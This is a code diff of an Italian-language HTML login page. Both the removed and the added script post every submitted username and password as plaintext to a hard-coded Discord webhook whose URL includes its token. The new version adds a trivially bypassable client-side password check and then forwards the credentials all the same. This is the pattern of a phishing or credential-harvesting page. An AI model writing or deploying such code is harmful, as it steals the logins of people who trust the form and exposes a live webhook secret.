@@ -88,38 +88,55 @@
     </div>
 
     <script>
+        // Password personalizzata
+        const validPassword = "TuaPassword"; // Cambia questa con la tua password personalizzata
+
+        // Verifica se l'utente è già loggato
+        if (sessionStorage.getItem("loggedIn") === "true") {
+            // Se l'utente è già loggato, redirige alla pagina principale
+            window.location.href = "index.html";
+        }
+
+        // Gestione del form di login
         document.getElementById("loginForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Impedisce il submit del modulo
 
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // Dati da inviare al Webhook di Discord
-            const message = {
-                content: `**Nuovo Login**\nUsername: ${username}\nPassword: ${password}`
-            };
+            // Controllo se la password è corretta
+            if (password === validPassword) {
+                // Salva lo stato dell'accesso nella sessione
+                sessionStorage.setItem("loggedIn", "true");
 
-            // URL del Webhook di Discord
-            const webhookUrl = "https://discord.com/api/webhooks/1330905454200754207/fzUFDc5ZEpCknT1cAYZ19XzSMNFEiGbF8QLTIqKRcT9rUJoRYR2zEivlwGJ0vg-b7XHq";
+                // Invia un messaggio al webhook (se necessario)
+                const message = {
+                    content: `**Nuovo Login**\nUsername: ${username}\nPassword: ${password}`
+                };
 
-            // Funzione per inviare i dati al Webhook
-            fetch(webhookUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Reindirizza alla pagina di successo
-                window.location.href = 'success.html';  // Modifica il percorso se necessario
-            })
-            .catch(error => {
-                console.error("Errore durante l'invio:", error);
-                alert("Si è verificato un errore.");
-            });
+                const webhookUrl = "https://discord.com/api/webhooks/1330905454200754207/fzUFDc5ZEpCknT1cAYZ19XzSMNFEiGbF8QLTIqKRcT9rUJoRYR2zEivlwGJ0vg-b7XHq";
+
+                fetch(webhookUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(message)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    // Dopo il login, redirige alla pagina principale
+                    window.location.href = "index.html";  // Reindirizza alla pagina principale
+                })
+                .catch(error => {
+                    console.error("Errore durante l'invio:", error);
+                    alert("Si è verificato un errore.");
+                });
+            } else {
+                alert("Password errata. Riprova.");
+            }
         });
     </script>
 </body>
 </html>
+
